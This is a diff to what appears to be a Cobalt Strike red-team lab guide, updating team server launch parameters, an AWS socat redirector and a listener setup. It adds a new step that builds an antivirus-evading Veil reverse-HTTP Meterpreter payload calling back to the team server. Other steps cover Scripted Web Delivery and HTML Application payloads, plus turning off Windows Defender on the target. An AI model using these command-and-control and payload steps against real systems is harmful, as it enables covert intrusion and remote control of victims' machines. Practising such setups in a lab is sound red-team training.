@@ -15,9 +15,9 @@ Install or update
 
 Start the team server
     There are 2 mandotory parameters and 2 optional parameters. The first 2 parameters are required.
-    ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons>
+    ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>
 
-    ./teamserver 192.168.1.5 password /opt/cobaltstrike/third-party/profiles/APT/etumbot.profile 2021-12-31
+    ./teamserver 192.168.1.5 password /opt/cobaltstrike/malleable-c2-profiles/APT/etumbot.profile 2021-12-31
 
     When the team server starts, it will display the SHA256 hash of the SSL cert. Send this hash to your team members.
 
@@ -39,8 +39,8 @@ Remove old data as needed
 
 # HTTP Redirector
 
-Set up an Ubuntu VM, install socat and point it to your CS server.
-When creating a listener, use the IP of your Ubuntu VM.
+Create a Ubuntu instance in AWS, install socat and point it to your CS server.
+When creating a listener, use the IP of your Ubuntu instance.
 
 screen
 socat TCP4-LISTEN:80,fork TCP4:<CS server IP>:80
@@ -52,7 +52,6 @@ Cobalt Strike > Listeners > Add
 Name: Initial access
 Payload: Beacon HTTP
 HTTP Hosts: click the plus sign > you should see your IP address > OK
-HTTP Port: 80
 Save > OK
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -63,6 +62,23 @@ Disable Windows Defender on your Windows VM.
     Standard: Windows Defender settings > turn off Real-time protection
 
 Attack 1
+    Attacks > Packages > Payload Generator
+    Select the listener you just created > Choose
+    Output: Veil
+    Check Use x64 payload
+    Generate
+    Select the location for the payload > Save > OK
+
+    cd /opt/Veil
+    ./Veil.py
+    use 1 (Evasion)
+    list (list payloads)
+    use 9 (cs/meterpreter/rev_http.py)
+    set LHOST <IP of your team server>
+    generate
+    Give your payload a name
+
+Attack 2
     Attacks > Web Drive-by > Scripted Web Delivery (S)
     URI Path: /a
     Local Host: (same IP as your server)
@@ -92,7 +108,7 @@ Clean up
     Select each line > Kill
     Liteners > Restart > OK
 
-Attack 2
+Attack 3
     Attacks > Packages > HTML Application
     Listener: Initial access > Choose
     Method: Executable
